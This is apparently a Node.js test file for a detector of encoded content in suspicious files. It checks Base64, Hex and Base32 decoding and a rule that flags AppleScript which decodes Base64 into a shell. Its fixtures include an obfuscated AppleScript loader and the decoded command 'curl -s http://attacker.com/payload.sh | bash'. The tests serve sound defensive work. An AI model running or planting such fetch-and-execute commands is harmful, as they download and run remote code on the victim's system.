'use strict';
// base64-hex.test.js — Base64 / Hex / Base32 decode round-trips.
//
// `base64-hex.js` mounts both *finder* and *decoder* methods onto
// `EncodedContentDetector.prototype`. The finders are heavy (regex +
// entropy + plausibility gates) and exercised by the e2e fixture
// suite. Here we cover the three pure decoders directly:
// `_decodeBase64`, `_decodeHex`, `_decodeBase32`. They are the
// terminal step of the recursive decode pipeline — every Base64 /
// Hex finding eventually hits one of these methods.

const test = require('node:test');
const assert = require('node:assert/strict');
const { loadModules } = require('../helpers/load-bundle.js');

// The decoder methods live on `EncodedContentDetector.prototype` after
// the Object.assign call in base64-hex.js runs; load both files.
const ctx = loadModules([
  'src/constants.js',
  'src/encoded-content-detector.js',
  'src/decoders/whitelist.js',
  'src/decoders/entropy.js',
  'src/decoders/base64-hex.js',
]);
const { EncodedContentDetector } = ctx;
const detector = new EncodedContentDetector();

/** Convert a Uint8Array to an ASCII string (host realm safe). */
function bytesToAscii(bytes) {
  return String.fromCharCode.apply(null, Array.from(bytes));
}

test('base64-hex: _decodeBase64 round-trips a simple ASCII payload', () => {
  // "Hello, World!" → "SGVsbG8sIFdvcmxkIQ=="; the canonical Base64
  // smoke test. Verifies the atob path + the byte-extract loop.
  const out = detector._decodeBase64('SGVsbG8sIFdvcmxkIQ==');
  assert.ok(out instanceof ctx.Uint8Array, 'must return Uint8Array');
  assert.equal(bytesToAscii(out), 'Hello, World!');
});

test('base64-hex: _decodeBase64 normalises URL-safe alphabet', () => {
  // The decoder accepts the URL-safe Base64 variant (RFC 4648 §5):
  // `+` → `-`, `/` → `_`, optional `=` padding stripped. The
  // decoder swaps them back before atob.
  // "??>?" (bytes 3F 3F 3E 3F) → standard "Pz8+Pw==", URL-safe "Pz8-Pw"
  const out = detector._decodeBase64('Pz8-Pw');
  assert.deepEqual(Array.from(out), [0x3F, 0x3F, 0x3E, 0x3F]);
});

test('base64-hex: _decodeBase64 auto-pads missing `=`', () => {
  // Real-world payloads are routinely stripped of trailing `=` to dodge
  // naïve detectors. The decoder pads on the way in — round-trip must
  // still produce the canonical bytes.
  // "abc" → "YWJj" (no padding required), "ab" → "YWI=" but "YWI" un-
  // padded is what we test.
  const out = detector._decodeBase64('YWI');
  assert.equal(bytesToAscii(out), 'ab');
});

test('base64-hex: _decodeBase64 returns null for invalid input', () => {
  // The atob() path throws on non-Base64 bytes; the decoder catches and
  // returns null so the caller can drop the candidate without a console
  // wall of errors.
  assert.equal(detector._decodeBase64('!!!not-base64!!!'), null);
});

test('base64-hex: _decodeHex round-trips an even-length hex string', () => {
  // "deadbeef" → 4 bytes [0xDE, 0xAD, 0xBE, 0xEF]. Standard contiguous-
  // hex shape (no `0x` prefix, no separators).
  const out = detector._decodeHex('deadbeef');
  assert.deepEqual(Array.from(out), [0xDE, 0xAD, 0xBE, 0xEF]);
});

test('base64-hex: _decodeHex strips whitespace before parsing', () => {
  // PowerShell byte arrays / shellcode comments often interleave
  // whitespace. The decoder collapses any `\s+` run before chunking
  // into pairs. This is the implementation contract; verify here so
  // a future "tighten whitespace handling" change announces itself.
  const out = detector._decodeHex('de ad\tbe\nef');
  assert.deepEqual(Array.from(out), [0xDE, 0xAD, 0xBE, 0xEF]);
});

test('base64-hex: _decodeHex returns null for odd-length input', () => {
  // Hex with an odd number of digits cannot represent a whole byte
  // count — the decoder rejects rather than silently truncating.
  assert.equal(detector._decodeHex('abc'), null);
});

test('base64-hex: _decodeBase32 round-trips an RFC 4648 fixture', () => {
  // RFC 4648 §10 fixture: "foobar" → "MZXW6YTBOI======". With
  // `=`-padding stripped (the decoder strips trailing `=` first),
  // "MZXW6YTBOI" decodes back to bytes 'f','o','o','b','a','r'.
  const out = detector._decodeBase32('MZXW6YTBOI======');
  assert.equal(bytesToAscii(out), 'foobar');
});

test('base64-hex: _decodeBase32 lowercase input is normalised', () => {
  // The decoder applies `ch.toUpperCase()` before alphabet lookup so
  // a lowercase input string still resolves. Real-world payloads are
  // a mix of cases.
  const out = detector._decodeBase32('mzxw6ytboi');
  assert.equal(bytesToAscii(out), 'foobar');
});

test('base64-hex: _decodeBase32 returns null for non-Base32 chars', () => {
  // The Base32 alphabet is A-Z + 2-7. Anything outside (e.g. `1`, `0`,
  // `8`, `9`, lowercase letters that aren't normalised) is rejected
  // via the `alphabet.indexOf(ch) === -1` gate, returning null.
  assert.equal(detector._decodeBase32('00000000'), null);
});

// ── AppleScript base64-decode-var rescue pass ─────────────────────────────

test('base64-hex: AppleScript rescue emits 60-char b64 in `set X to "…"` + `base64 -D` context', () => {
  // The default-mode length floor is 64 chars. A real-world
  // AppleScript malware pattern looks like:
  //
  //   set b64 to "Y3VybCAtcyBodHRwOi8vYXR0YWNrZXIuY29tL3BheWxvYWQuc2ggfCBiYXNo"
  //   do shell script "echo " & b64 & " | base64 -D | bash"
  //
  // The base64 is 60 chars — below the floor. Without the rescue, no
  // top-level Base64 finding emits, so the embedded URL IOC never
  // surfaces until the analyst clicks "Load for analysis" on the
  // AppleScript shell-sink finding. The rescue detects the
  // `set <var> to "…"` preamble + downstream `<var> … base64 -D` usage
  // and promotes the candidate to high-confidence.
  const b64 = 'Y3VybCAtcyBodHRwOi8vYXR0YWNrZXIuY29tL3BheWxvYWQuc2ggfCBiYXNo'; // 60 chars
  const text =
    `set b64 to "${b64}"\n` +
    `do shell script "echo " & b64 & " | base64 -D | bash"`;
  const cands = detector._findBase64Candidates(text, {});
  const hit = cands.find(c => c.raw === b64);
  assert.ok(hit, `expected base64 rescue candidate; got: ${JSON.stringify(cands)}`);
  assert.equal(hit.confidence, 'high');
  assert.equal(hit.autoDecoded, true);
  assert.equal(hit.hint, 'AppleScript base64-decode variable');
});

test('base64-hex: AppleScript rescue does NOT fire when downstream has no base64 -D', () => {
  // Conservative gate: the rescue must see a `base64 -D|-d|--decode`
  // pipeline downstream. A bare quoted 60-char blob without the
  // downstream context stays below the 64-char floor.
  const b64 = 'Y3VybCAtcyBodHRwOi8vYXR0YWNrZXIuY29tL3BheWxvYWQuc2ggfCBiYXNo';
  const text =
    `set b64 to "${b64}"\n` +
    `do shell script "echo " & b64 & " | cat"`;
  const cands = detector._findBase64Candidates(text, {});
  const hit = cands.find(c => c.raw === b64);
  assert.equal(hit, undefined,
    `no base64 -D context → rescue must not fire; got: ${JSON.stringify(cands)}`);
});

test('base64-hex: AppleScript rescue requires `set` preamble (skips bare quoted blobs)', () => {
  // The rescue trigger is specifically `set <var> to "<b64>"`. A bare
  // quoted 60-char blob not bound to a named variable doesn't get
  // rescued — even if `base64 -D` appears elsewhere in the file.
  const b64 = 'Y3VybCAtcyBodHRwOi8vYXR0YWNrZXIuY29tL3BheWxvYWQuc2ggfCBiYXNo';
  const text =
    `display dialog "${b64}"\n` +
    `do shell script "echo something | base64 -D | bash"`;
  const cands = detector._findBase64Candidates(text, {});
  const hit = cands.find(c => c.raw === b64);
  assert.equal(hit, undefined,
    `bare quoted b64 without set-preamble must not rescue; got: ${JSON.stringify(cands)}`);
});

test('base64-hex: AppleScript rescue decodes the candidate to the expected curl-pipe-shell cleartext', () => {
  // End-to-end: the rescued candidate's raw bytes round-trip through
  // the `_decodeBase64` path to the original curl-pipe-bash string.
  const b64 = 'Y3VybCAtcyBodHRwOi8vYXR0YWNrZXIuY29tL3BheWxvYWQuc2ggfCBiYXNo';
  const text =
    `set b64 to "${b64}"\n` +
    `do shell script "echo " & b64 & " | base64 -D | bash"`;
  const cands = detector._findBase64Candidates(text, {});
  const hit = cands.find(c => c.raw === b64);
  assert.ok(hit, 'rescue candidate must emit');
  const decoded = detector._decodeBase64(hit.raw);
  assert.ok(decoded instanceof ctx.Uint8Array);
  assert.equal(bytesToAscii(decoded),
    'curl -s http://attacker.com/payload.sh | bash');
});
